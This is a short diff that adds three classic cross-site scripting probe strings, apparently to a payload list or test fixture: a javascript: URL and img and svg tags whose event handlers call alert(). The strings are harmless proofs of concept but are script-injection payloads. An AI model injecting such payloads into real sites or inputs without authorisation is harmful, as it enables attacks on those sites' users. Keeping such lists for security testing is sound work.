@@ -1,0 +1,3 @@
+javascript:alert('DOM-XSS')
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
